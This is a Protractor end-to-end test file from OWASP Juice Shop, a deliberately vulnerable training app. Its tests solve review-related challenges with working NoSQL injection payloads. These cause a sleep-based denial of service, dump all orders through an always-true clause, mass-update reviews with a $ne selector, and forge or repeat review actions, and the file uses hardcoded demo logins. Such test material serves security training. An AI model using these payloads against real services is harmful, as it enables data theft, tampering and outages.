/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { browser, protractor } from 'protractor'
const utils = require('../../lib/utils')

describe('/rest/products/reviews', () => {
  beforeEach(() => {
    void browser.get(`${protractor.basePath}/#/search`)
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "NoSQL DoS"', () => {
      protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to inject a command into the get route', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('GET', `${baseUrl}/rest/products/sleep(1000)/reviews`, true)
          xhttp.setRequestHeader('Content-type', 'text/plain')
          xhttp.send()
        }, browser.baseUrl)
        void browser.driver.sleep(5000)
        void browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'NoSQL DoS' })
    })

    describe('challenge "NoSQL Exfiltration"', () => {
      it('should be possible to inject and get all the orders', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('GET', `${baseUrl}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`, true)
          xhttp.setRequestHeader('Content-type', 'text/plain')
          xhttp.send()
        }, browser.baseUrl)
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'NoSQL Exfiltration' })
    })
  }

  describe('challenge "NoSQL Manipulation"', () => {
    it('should be possible to inject a selector into the update route', () => {
      void browser.waitForAngularEnabled(false)
      void browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","${browser.baseUrl}/rest/products/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));`) // eslint-disable-line
      void browser.driver.sleep(1000)
      void browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Manipulation' })
  })

  describe('challenge "Forged Review"', () => {
    protractor.beforeEach.login({ email: `mc.safesearch@${config.get('application.domain')}`, password: 'Mr. N00dles' })

    it('should be possible to edit any existing review', () => {
      void browser.waitForAngularEnabled(false)
      void browser.executeScript((baseUrl: string) => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id
            editReview(reviewId)
          }
        }

        xhttp.open('GET', `${baseUrl}/rest/products/1/reviews`, true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()

        function editReview (reviewId) {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('PATCH', `${baseUrl}/rest/products/reviews`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send(JSON.stringify({ id: reviewId, message: 'injected' }))
        }
      }, browser.baseUrl)
      void browser.driver.sleep(5000)
      void browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Forged Review' })
  })

  describe('challenge "Multiple Likes"', () => {
    protractor.beforeEach.login({ email: `mc.safesearch@${config.get('application.domain')}`, password: 'Mr. N00dles' })

    it('should be possible to like reviews multiple times', () => {
      void browser.waitForAngularEnabled(false)
      void browser.executeScript((baseUrl: string) => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id
            sendPostRequest(reviewId)
            sendPostRequest(reviewId)
            sendPostRequest(reviewId)
          }
        }

        xhttp.open('GET', `${baseUrl}/rest/products/1/reviews`, true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()

        function sendPostRequest (reviewId: string) {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('POST', `${baseUrl}/rest/products/reviews`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send(JSON.stringify({ id: reviewId }))
        }
      }, browser.baseUrl)
      void browser.driver.sleep(5000)
      void browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({ challenge: 'Multiple Likes' })
  })
})
